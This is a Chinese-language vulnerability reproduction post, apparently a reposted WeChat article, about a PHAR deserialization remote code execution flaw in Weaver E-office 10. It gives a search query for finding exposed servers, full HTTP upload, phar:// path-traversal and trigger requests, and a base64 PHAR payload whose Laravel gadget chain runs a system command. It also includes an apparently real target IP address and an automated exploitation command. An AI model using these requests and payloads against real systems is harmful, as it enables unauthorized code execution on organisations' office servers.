<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zFQ1DZZojm3ww1jq0ReVhw)

一、漏洞简介
======

泛微 eoffice10 协同办公平台是一款专业的 office 办公的工具软件。软件支持在线多人编辑文件，并且会在第一时间收发协作需求。十分方便快捷，界面简约，布局直观清晰，操作简单，极易上手，是一款不可多得的利器。泛微 E-office 10 处理上传的 PHAR 文件时存在缺陷。攻击者能够上传伪装的 PHAR 文件到服务器，利用 PHP 处理 PHAR 文件时自动进行的反序列化机制来触发远程代码执行。

二、资产测绘
======

hunter：web.body="eoffice10"&&web.body="eoffice_loading_tip"

![](https://mmbiz.qpic.cn/mmbiz_jpg/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9hmHjqDia0w1YMvA85YCIg2EN0EIicjuQGW58ewGIFoIz1gka90icJKr4w/640?wx_fmt=jpeg&from=appmsg)

三、漏洞复现
======

1、生成 phar 文件

2、上传 phar 文件，获取回显中 attachment_id 值 (执行命令时需要)

/eoffice10/server/public/api/attachment/atuh-fi

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF95Bic2NPV3Vqz44KibnyTy3jSLpWra2uw5qU43qVvibcUwgPiboNibwYg2HQ/640?wx_fmt=png&from=appmsg)

📎phar.phar.zip

data 需要 base64 解密

```
POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 524
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Accept-Encoding: gzip, deflate

--00content0boundary00
Content-Disposition: form-data; 
Content-Type: image/jpeg

R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQorAQAAAQAAABEAAAABAAAAAAD9AAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6MTI6ImVjaG8gc3RjdGVzdCI7fX0IAAAAdGVzdC50eHQEAAAARf0FZgQAAAAMfn82AQAAAAAAAHRlc3RoZA/9TR1P/f39Ef39OiT9/SP9QgIAAABHQk1C

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF99Sd7SsPFKichuGyuadLZOWiam3gX3MxoicrBWe7PX1KYvhNwOe3JqsPzA/640?wx_fmt=png&from=appmsg)

3、利用 Phar:// 伪协议读取 phar 文件

```
POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Length: 69
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F

```

4、通过第一步获取的 id 触发漏洞

```
POST /eoffice10/server/public/api/empower/import HTTP/1.1
Host: 211.142.45.227:8010
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Length: 47
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

type=tttt&file=3487d6e84f8cfab81ddb05c3c403ada1

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9SicKAeeZAMaYfHtVu5hHGmUOULxicPeZctC7k8jwlwCbDQAq8ibRkOs0Q/640?wx_fmt=png&from=appmsg)

4、漏洞利用
======

```
xpoc -r 421 -t http://xxx

```

![](https://mmbiz.qpic.cn/mmbiz_png/SIeSFr9Ws7Gp4IVMjp3picGIEKdA9UMF9Y1AQGWiaoETve0EsX7FePBabs8vKafboYd01rs61gv84cgWKgBDmBxQ/640?wx_fmt=png&from=appmsg)